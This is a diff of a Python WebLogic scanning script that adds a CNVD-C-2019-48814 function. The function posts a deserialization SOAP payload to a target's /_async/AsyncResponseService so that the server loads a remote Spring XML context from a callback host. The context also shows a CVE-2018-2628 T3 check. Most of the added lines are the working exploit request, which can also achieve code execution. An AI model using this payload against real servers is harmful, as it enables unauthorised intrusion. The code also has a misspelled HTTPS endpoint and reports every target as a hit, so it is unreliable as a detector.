@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
 # @Author: kingkk
 # @Date:   2018-11-06 19:31:09
-# @Last Modified by:   King kaki
-# @Last Modified time: 2018-11-08 18:33:35
+# @Last Modified by:   kingkk
+# @Last Modified time: 2019-05-15 19:46:08
 import requests
 import re
 import time
@@ -214,3 +214,50 @@ def CVE_2018_2628(target):
 	buildT3RequestObject(sock,port)
 	rs=sendEvilObjData(sock)
 	checkVul(rs,server_addr)
+
+def CNVD_C_2019_48814(target):
+	from config import server
+	host, port = target.split(":")
+	if int(port) == 443:
+		url = 'https://{}/_async/AsyncResponseServicee'.format(host)
+
+	else:
+		url = 'http://{}:{}/_async/AsyncResponseService'.format(host, port)
+	headers = {
+		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Content-Type": "text/xml",
+		"Accept-Encoding": "gzip, deflate",
+		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+	}
+	server_host = re.search(r'http://([^/]+)', server)
+	try:
+		server_host = server_host.group(1)
+	except:
+		server_host = server
+	data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header> 
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java>
+<class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
+<void>
+<string>http://{}.{}</string>
+</void>
+</class>
+</java>
+</work:WorkContext>   
+</soapenv:Header>   
+<soapenv:Body>     
+<asy:onAsyncDelivery/>   
+</soapenv:Body>
+</soapenv:Envelope>'''.format(host, server_host)
+
+	r = requests.post(url, data=data,verify=False, headers=headers, timeout=TIMEOUT)
+
+	primary("[+] CNVD-C-2019-48814: {}".format(target))
+
+
+def test():
+	print("test")
